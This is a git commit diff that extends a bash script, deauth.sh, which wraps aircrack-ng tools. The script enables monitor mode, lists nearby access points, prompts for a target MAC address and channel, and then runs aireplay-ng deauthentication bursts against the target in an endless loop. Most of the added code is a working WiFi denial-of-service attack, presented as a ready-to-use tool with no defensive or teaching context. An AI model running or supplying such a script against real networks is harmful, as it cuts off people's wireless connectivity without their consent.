5e9f44b2edebf1e40d2b2d5e5b8bd293dfe9bcad
Chris Cleggett <chris@localhost.localdomain>
2019-11-28 22:28:22 +0000

    Pre-release 2

--- deauth.sh
+++ deauth.sh
@@ -14,6 +14,26 @@ airmon-ng start $wcard
 sleep 5
 clear
 
-echo "A window will open shortly showing a list of APs nearby. When you have found the MAC you want, close the window."
+echo "A window will open shortly showing a list of APs nearby. When you have found the MAC, and channel number you need, close the window."
 sleep 5
 xterm -e airodump-ng wlan1
+
+clear
+
+echo -n "Enter the MAC address of the target: "
+read mac
+
+echo -n "Enter the channel number: "
+read chan
+
+echo "In a new termnal, run as root, type: airodump-ng --channel $chan $wcard  then run the command. The attack commences in 60 seconds."
+sleep 60
+
+for (( ; ; ))
+do
+   echo "Press CTRL+C to stop..."
+   aireplay-ng -0 100 -a $mac $wcard
+   sleep 60
+done
+
+airmon-ng stop $wcard
